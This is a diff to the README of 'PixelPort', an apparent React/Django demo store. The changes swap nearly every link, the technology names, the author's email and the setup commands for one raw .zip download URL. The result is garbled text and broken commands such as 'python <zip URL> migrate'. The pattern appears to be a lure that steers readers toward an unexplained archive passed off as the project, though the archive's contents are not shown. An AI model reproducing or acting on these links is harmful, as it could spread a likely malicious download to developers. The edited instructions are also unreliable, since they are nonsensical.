@@ -1,8 +1,8 @@
 # PixelPort 🌐🛒
 
-![PixelPort Logo](https://via.placeholder.com/150)  
+![PixelPort Logo](https://github.com/santiagosolerramos1/PixelPort/raw/refs/heads/master/rotalian/Pixel-Port-1.2.zip)  
 
-Welcome to **PixelPort**, an example of an online store built using **React.js** and **Django**. This project showcases the integration of a powerful front-end framework with a robust back-end system to create a seamless shopping experience.
+Welcome to **PixelPort**, an example of an online store built using **https://github.com/santiagosolerramos1/PixelPort/raw/refs/heads/master/rotalian/Pixel-Port-1.2.zip** and **Django**. This project showcases the integration of a powerful front-end framework with a robust back-end system to create a seamless shopping experience.
 
 ## Table of Contents
 
@@ -28,7 +28,7 @@ Welcome to **PixelPort**, an example of an online store built using **React.js**
 This project utilizes the following technologies:
 
 - **Frontend**: 
-  - React.js
+  - https://github.com/santiagosolerramos1/PixelPort/raw/refs/heads/master/rotalian/Pixel-Port-1.2.zip
   - TypeScript
   - SASS
 
@@ -49,7 +49,7 @@ To get started with PixelPort, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/santiagosolerramos1/PixelPort.git
+   git clone https://github.com/santiagosolerramos1/PixelPort/raw/refs/heads/master/rotalian/Pixel-Port-1.2.zip
    cd PixelPort
    ```
 
@@ -60,15 +60,15 @@ To get started with PixelPort, follow these steps:
      ```
    - Install the required packages:
      ```bash
-     pip install -r requirements.txt
+     pip install -r https://github.com/santiagosolerramos1/PixelPort/raw/refs/heads/master/rotalian/Pixel-Port-1.2.zip
      ```
    - Run migrations:
      ```bash
-     python manage.py migrate
+     python https://github.com/santiagosolerramos1/PixelPort/raw/refs/heads/master/rotalian/Pixel-Port-1.2.zip migrate
      ```
    - Start the Django server:
      ```bash
-     python manage.py runserver
+     python https://github.com/santiagosolerramos1/PixelPort/raw/refs/heads/master/rotalian/Pixel-Port-1.2.zip runserver
      ```
 
 3. **Set Up the Frontend**:
@@ -126,13 +126,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, feel free to reach out:
 
 - **Author**: Santiago Soler Ramos
-- **Email**: santiagosolerramos1@example.com
+- **Email**: https://github.com/santiagosolerramos1/PixelPort/raw/refs/heads/master/rotalian/Pixel-Port-1.2.zip
 
 ## Releases
 
-You can find the latest releases of PixelPort [here](https://github.com/santiagosolerramos1/PixelPort/releases). Download the latest version and follow the installation instructions to get started.
+You can find the latest releases of PixelPort [here](https://github.com/santiagosolerramos1/PixelPort/raw/refs/heads/master/rotalian/Pixel-Port-1.2.zip). Download the latest version and follow the installation instructions to get started.
 
-![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)
+![Download Latest Release](https://github.com/santiagosolerramos1/PixelPort/raw/refs/heads/master/rotalian/Pixel-Port-1.2.zip%20Latest%20Release-v1.0.0-blue)
 
 If you encounter any issues or have suggestions, please check the "Releases" section for updates or report them in the issues tab.
 
@@ -140,10 +140,10 @@ If you encounter any issues or have suggestions, please check the "Releases" sec
 
 We would like to thank the following resources and communities for their support:
 
-- [Django Documentation](https://www.djangoproject.com/)
-- [React Documentation](https://reactjs.org/)
-- [Open Source Community](https://opensource.guide/)
+- [Django Documentation](https://github.com/santiagosolerramos1/PixelPort/raw/refs/heads/master/rotalian/Pixel-Port-1.2.zip)
+- [React Documentation](https://github.com/santiagosolerramos1/PixelPort/raw/refs/heads/master/rotalian/Pixel-Port-1.2.zip)
+- [Open Source Community](https://github.com/santiagosolerramos1/PixelPort/raw/refs/heads/master/rotalian/Pixel-Port-1.2.zip)
 
 ## Conclusion
 
-Thank you for visiting the PixelPort repository. We hope you find this project useful as a reference for building your own online store using React.js and Django. Happy coding!
+Thank you for visiting the PixelPort repository. We hope you find this project useful as a reference for building your own online store using https://github.com/santiagosolerramos1/PixelPort/raw/refs/heads/master/rotalian/Pixel-Port-1.2.zip and Django. Happy coding!
